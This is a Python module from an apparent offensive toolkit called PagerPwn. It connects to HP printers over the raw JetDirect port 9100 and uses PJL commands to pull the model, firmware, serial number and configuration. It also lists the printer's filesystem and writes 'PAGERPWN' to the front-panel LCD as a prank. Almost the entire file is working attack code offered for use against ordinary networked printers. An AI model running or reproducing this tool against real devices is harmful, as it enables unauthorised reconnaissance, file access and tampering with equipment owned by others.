"""
jetdirect.py - HP JetDirect PJL enumeration + LCD prank for PagerPwn

Connects to HP printer on port 9100 (JetDirect/PJL).
Dumps device info, config, filesystem listing.
Bonus: writes "PAGERPWN" to the printer's front-panel LCD.

Module interface: run(config, ui_callback, stop_event) -> dict
"""

import socket
import time

PRINTER_PORT = 9100
TIMEOUT = 5

# PJL Universal Exit Language (UEL) prefix
UEL = "\x1b%-12345X"
PJL_PREFIX = "@PJL "


def _pjl_cmd(sock, command, expect_response=True):
    """Send a PJL command and optionally read the response."""
    full_cmd = f"{UEL}{PJL_PREFIX}{command}\r\n"
    try:
        sock.sendall(full_cmd.encode())
    except Exception:
        return ""

    if not expect_response:
        return ""

    time.sleep(0.5)
    response = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    except Exception:
        pass

    return response.decode(errors="replace").strip()


def _parse_info(text, prefix=""):
    """Extract key-value pairs from PJL INFO response."""
    info = {}
    for line in text.split("\n"):
        line = line.strip()
        if "=" in line:
            key, _, val = line.partition("=")
            info[key.strip()] = val.strip().strip('"')
        elif line and not line.startswith("@PJL"):
            if prefix:
                info[prefix] = info.get(prefix, "") + line + " "
    return info


def run(config, ui_callback, stop_event=None):
    """
    Enumerate HP printer via PJL and write to its LCD.

    Returns:
        dict: {"model": str, "serial": str, "firmware": str,
               "config_dump": str, "fs_listing": str, "lcd_written": bool}
    """
    target_ip = config.get("TARGETS", {}).get("Printer", "")
    result = {
        "model": "",
        "serial": "",
        "firmware": "",
        "config_dump": "",
        "fs_listing": "",
        "lcd_written": False,
    }

    ui_callback("[JETDIRECT]", f"Connecting {target_ip}:9100")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((target_ip, PRINTER_PORT))
    except Exception as e:
        ui_callback("[JETDIRECT] FAIL", f"Connect: {str(e)[:25]}")
        time.sleep(2)
        return result

    ui_callback("[JETDIRECT]", "Enumerating device...")

    # ── Device Info ───────────────────────────────────────────────────────────
    info_resp = _pjl_cmd(sock, "INFO ID")
    if info_resp:
        # Typical: "hp LaserJet MFP M234sdw"
        for line in info_resp.split("\n"):
            line = line.strip()
            if line and not line.startswith("@PJL"):
                result["model"] = line[:60]
                break
    ui_callback("[JETDIRECT]", result["model"] or "Unknown model")

    # ── Status ────────────────────────────────────────────────────────────────
    status_resp = _pjl_cmd(sock, "INFO STATUS")
    if status_resp:
        parsed = _parse_info(status_resp)
        result["firmware"] = parsed.get("CODE", parsed.get("FIRMWARE", ""))

    # ── Config Dump ───────────────────────────────────────────────────────────
    config_resp = _pjl_cmd(sock, "INFO CONFIG")
    if config_resp:
        result["config_dump"] = config_resp[:2000]
        # Try to extract serial from config
        for line in config_resp.split("\n"):
            if "SERIAL" in line.upper():
                parts = line.split("=")
                if len(parts) >= 2:
                    result["serial"] = parts[1].strip().strip('"')
                    break

    ui_callback("[JETDIRECT]", f"S/N: {result['serial'][:20]}" if result["serial"] else "Scanning filesystem...")

    # ── Filesystem Listing ────────────────────────────────────────────────────
    fs_resp = _pjl_cmd(sock, 'FSDIRLIST NAME="0:/" ENTRY=1 COUNT=99')
    if fs_resp:
        result["fs_listing"] = fs_resp[:1000]

    # ── LCD Prank ─────────────────────────────────────────────────────────────
    ui_callback("[JETDIRECT]", "Writing to printer LCD...")
    _pjl_cmd(sock, 'RDYMSG DISPLAY="PAGERPWN"', expect_response=False)
    result["lcd_written"] = True

    # ── Cleanup ───────────────────────────────────────────────────────────────
    # Send UEL to reset printer to normal state
    try:
        sock.sendall(UEL.encode())
    except Exception:
        pass

    try:
        sock.close()
    except Exception:
        pass

    ui_callback("[JETDIRECT] DONE", result["model"][:30])
    return result
